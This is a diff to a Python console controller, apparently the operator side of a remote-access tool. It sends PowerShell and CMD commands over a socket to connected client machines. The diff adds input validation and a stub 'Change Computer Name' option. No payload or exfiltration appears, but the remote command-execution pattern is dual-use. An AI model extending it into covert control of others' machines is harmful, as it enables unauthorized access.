@@ -15,6 +15,7 @@ def bytes_to_number(b):
 def freestyle_menu():
     print(f"\t\t({colored('1', 'yellow')})Run Powershell Command")
     print(f"\t\t({colored('2', 'yellow')})Run CMD Command")
+    print(f"\t\t({colored('3', 'yellow')})Change Computer Name")
     print(f"\n\t\t({colored('0', 'yellow')})Back")
 
     return
@@ -23,8 +24,23 @@ def freestyle_menu():
 def freestyle(con, root, tmp_availables, clients):
     while True:
         freestyle_menu()
+
         try:
-            choice = input("#>")
+            choice = int(input("#>"))
+
+            if choice > 3:
+                print(f"[{colored('*', 'red')}]Wrong Number. "
+                      f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}]\n")
+                continue
+
+        except ValueError:
+            print(
+                f"[{colored('*', 'red')}]Numbers only. Choose between "
+                f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}].\n")
+            continue
+
+        try:
+            # Run Powershell Command
             if int(choice) == 1:
                 con.send("ps".encode())
                 cmd = input("PS>")
@@ -91,6 +107,7 @@ def freestyle(con, root, tmp_availables, clients):
                 dst = fr"{path}"
                 shutil.move(src, dst)
 
+            # Run CMD Command
             elif int(choice) == 2:
                 con.send("cmd".encode())
                 cmd = input("CMD>")
@@ -156,6 +173,10 @@ def freestyle(con, root, tmp_availables, clients):
                 src = os.path.abspath(filename)
                 dst = fr"{path}"
                 shutil.move(src, dst)
+
+            # Change Hostname
+            elif int(choice) == 3:
+                pass
 
             elif int(choice) == 0:
                 con.send("back".encode())
